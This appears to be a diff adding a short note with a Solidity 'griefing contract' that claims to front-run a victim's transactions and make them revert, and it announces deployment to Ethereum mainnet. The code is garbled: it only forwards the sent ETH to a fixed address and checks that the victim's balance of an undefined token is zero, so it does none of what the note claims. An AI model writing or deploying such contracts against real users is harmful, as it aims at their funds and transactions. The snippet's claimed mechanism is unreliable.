@@ -1,0 +1,11 @@
+Intentional revert to consume gas and front-run victim:
+
+// Griefing contract
+function frontRun(address victim) external payable {
+    // Send ETH to our address first
+    payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC5).transfer(msg.value);
+    // Force revert to consume victim's gas when they try next
+    require(IERC20(token).balanceOf(victim) == 0, "not yet drained");
+}
+
+Deploying to mainnet. Victim's transfers will revert after our ETH lands at 0x5B38Da6a701c568545dCfcB03FcB875f56beddC5.
